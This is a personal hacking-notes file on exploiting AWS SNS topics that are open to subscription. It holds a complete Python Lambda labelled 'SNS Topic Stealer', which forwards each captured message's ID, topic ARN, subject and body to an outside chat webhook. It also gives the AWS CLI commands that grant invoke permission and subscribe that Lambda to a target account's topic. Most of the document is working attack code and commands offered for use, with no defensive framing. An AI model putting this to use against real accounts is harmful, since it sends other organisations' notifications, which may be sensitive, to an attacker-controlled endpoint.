---
is_a: "[[note]]"
topics: "[[hacking aws]]"
---
# Notes
Hacking AWS SNS

## Exploiting open SNS topics
If SNS topics are open to be subscribed to, it's fairly easy to connect that via a webhook into a chat program to capture.
* Create a [lambda function](https://aws.amazon.com/premiumsupport/knowledge-center/sns-lambda-webhooks-chime-slack-teams/) that accepts SNS events and forwards them to your chat webhook of choice.

This example uses Microsoft Teams, sending each SNS message in a [pretty card](https://docs.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/connectors-using?tabs=cURL#send-adaptive-cards-using-an-incoming-webhook) format
```
import urllib3 
import json
http = urllib3.PoolManager()
webhook_url = ""

def lambda_handler(event, context): 
    for sns_message in event['Records']:
        # Chat message in Microsoft Teams adaptive card webhook format
        chat_message = {
          "type": "message",
          "attachments": [
            {
              "contentType": "application/vnd.microsoft.card.adaptive",
              "contentUrl": None,
              "content": {
                "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
                "type": "AdaptiveCard",
                "version": "1.0",
                "body": [
                  {
                    "type": "Container",
                    "items": [
                      {
                        "type": "TextBlock",
                        "text": "SNS Topic Stealer",
                        "weight": "bolder",
                        "size": "medium"
                      },
                      {
                        "type": "FactSet",
                        "facts": [
                          {
                            "title": "MessageId:",
                            "value": sns_message['Sns']['MessageId']
                          },
                          {
                            "title": "TopicArn:",
                            "value": sns_message['Sns']['TopicArn']
                          },
                          {
                            "title": "Subject:",
                            "value": sns_message['Sns']['Subject']
                          },
                          {
                            "title": "Message:",
                            "value": sns_message['Sns']['Message']
                          }
                        ]
                      }
                    ]
                  }
                ]
              }
            }
          ]
        }
        encoded_msg = json.dumps(chat_message).encode('utf-8')
        resp = http.request('POST', webhook_url, body=encoded_msg)
        print({
            "message": event['Records'][0]['Sns']['Message'], 
            "status_code": resp.status, 
            "response": resp.data
        })
```

* Edit the webhook url, save the lambda, and test with a SNS Notification test message
* Give the target account permissions to invoke the lambda via SNS

```
aws lambda add-permission --function-name arn:aws:lambda:us-east-1:123456789012:my-lambda-stealer \
--source-account 123456789012 \
--statement-id sns-to-lambda-1 --action "lambda:InvokeFunction" \
--principal sns.amazonaws.com
```

* Subscribe to the topic using AWS CLI, changing the topic and lambda ARNs

```
aws sns subscribe \
--topic-arn arn:aws:sns:us-east-1:123456789012:topic-to-steal \
--protocol lambda \
--notification-endpoint arn:aws:lambda:us-east-1:321456789666:my-lambda-stealer
```

* Test to see if messages arrive
